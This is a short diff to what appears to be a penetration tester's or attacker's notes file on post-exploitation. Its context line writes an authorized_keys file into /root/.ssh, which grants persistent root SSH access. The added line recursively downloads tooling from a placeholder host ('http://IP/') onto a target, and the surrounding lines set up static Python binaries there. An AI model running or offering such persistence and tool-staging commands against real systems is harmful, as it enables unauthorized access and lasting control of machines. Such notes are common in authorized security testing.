@@ -142,7 +142,8 @@ os.system("mkdir /root/.ssh; cp /tmp/k/authorized_keys /root/.ssh/")
 wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/python2.7
 wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/python2.7.zip
 
-# transfer files to target
+# recursive transfer files to target
+wget -r -np -nd -R "index.html*" http://IP/
 # set env-vars and run
 export PYTHONPATH=$(pwd)/python2.7.zip
 export PYTHONHOME=$(pwd)/python2.7.zip
